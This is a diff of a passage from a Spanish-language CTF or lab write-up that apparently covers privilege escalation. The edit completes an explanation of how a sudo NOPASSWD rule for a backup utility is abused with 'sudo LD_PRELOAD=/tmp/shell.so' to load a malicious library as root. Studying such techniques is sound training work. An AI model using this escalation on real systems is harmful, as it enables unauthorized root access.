@@ -400,7 +400,7 @@ Listamos los comandos que podemos ejecutar como root, ya que se me habia olvidad
 	User webdeveloper may run the following commands on sky:
 	    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
      
-Ejecutamos el binario pasandole nuestra 
+Ejecutamos como sudo la precarga de nuestra libreria compartida y le pasamos el comando a ejecutar en este caso el que se nos esta permitido ejecutar como root sky_backup_utility.
 
 	webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility 
 	
